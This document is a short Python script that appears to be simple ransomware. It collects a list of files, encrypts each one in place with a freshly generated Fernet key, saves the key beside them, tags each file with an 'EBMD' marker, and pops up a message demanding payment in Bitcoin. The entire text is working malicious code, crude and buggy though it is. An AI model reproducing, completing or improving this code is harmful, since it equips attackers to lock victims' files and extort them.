import os
import sys
from tools import addFiles, MBox
from cryptography.fernet import Fernet

files = addFiles()

print(files)

# MAKE KEY

key = Fernet.generate_key()

for file in files:
    with open(file, "r") as thefile:
        if thefile.read()[-4:] == "EBMD":
            print("Files Already Encrypted. \n Exiting Script...")
            sys.exit()
        else: ("not yet encrypted... encrypting now \n")

with open("thekey.key", "wb") as keyfile:
    keyfile.write(key)

#ENCRYPT FILES



for file in files:
    with open(file, "rb")as thefile:
        content = thefile.read()
    encryptedContent = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(encryptedContent)
    with open(file, "a") as thefile:
        thefile.write("EBMD")
    

    print(file + " has been encrypted")
MBox("YOU HAVE BEEN HACKED DUMMY","YOU MUST PAY $10,0000,000 IN BITCOIN IF YOU WANT YOUR FILES BACK",0)